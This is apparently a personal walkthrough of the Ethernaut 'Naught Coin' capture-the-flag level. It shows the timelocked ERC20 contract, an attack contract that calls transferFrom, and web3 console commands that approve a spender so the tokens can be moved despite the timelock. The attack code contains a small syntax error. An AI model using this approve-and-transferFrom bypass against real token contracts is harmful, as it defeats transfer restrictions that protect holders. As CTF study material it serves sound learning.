# 15. Naught Coin

Difficulty 5/10

NaughtCoin is an ERC20 token and you're already holding all of them. The catch is that you'll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.

  Things that might help

-   The [ERC20](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md) Spec
-   The [OpenZeppelin](https://github.com/OpenZeppelin/zeppelin-solidity/tree/master/contracts) codebase

https://ethereum.stackexchange.com/questions/80266/approve-contract-to-withdraw-funds-from-userss-wallet

copy Sources to remix then click ABI to get bytecode
![[Pasted image 20211127231638.png]]
enter into console  

```
abi = [pasted abi from remix]
var erc20Instance = new web3.eth.Contract(abi,contract.address);
```

depoly naughtAttack.sol on remix and get address
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/docs-v3.x/contracts/token/ERC20/ERC20.sol";

contract NaughtCoin is ERC20 {

	// string public constant name = 'NaughtCoin';
	// string public constant symbol = '0x0';
	// uint public constant decimals = 18;
	uint public timeLock = now + 10 * 365 days;
	uint256 public INITIAL_SUPPLY;
	address public player;

	constructor(address _player) 
	ERC20('NaughtCoin', '0x0')
	public {
		player = _player;
		INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
		// _totalSupply = INITIAL_SUPPLY;
		// _balances[player] = INITIAL_SUPPLY;
		_mint(player, INITIAL_SUPPLY);
		emit Transfer(address(0), player, INITIAL_SUPPLY);
	}

	function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
		super.transfer(_to, _value);
	}

	// Prevent the initial owner from transferring tokens until the timelock has passed
	modifier lockTokens() {
		if (msg.sender == player) {
			require(now > timeLock);
			_;
		} else {
			_;
		}
	} 
} 

	contract naughtAttack {

	function takeTokens() public {
			NaughtCoin(0x4D0227c26CE03E5e45Cae62ff65390f2195f16dA).transferFrom(msg.sender, address(this), 10 * (10 ** 18); // 0x4D0227c26CE03E5e45Cae62ff65390f2195f16dA = contract.address

	}

}
```


```
erc20Instance.methods.approve("0x05259881ca7e4413638E7BcfB26Be5C774584ea4", "1000000000000000000000000").send({from: "[player address]"});

erc20Instance.methods.approve("[naughtAttack contract address]", "1000000000000000000000000").send({from: "[player address]"});
```

**END**
Level completed!

Difficulty 5/10

When using code that's not your own, it's a good idea to familiarize yourself with it to get a good understanding of how everything fits together. This can be particularly important when there are multiple levels of imports (your imports have imports) or when you are implementing authorization controls, e.g. when you're allowing or disallowing people from doing things. In this example, a developer might scan through the code and think that `transfer` is the only way to move tokens around, low and behold there are other ways of performing the same operation with a different implementation.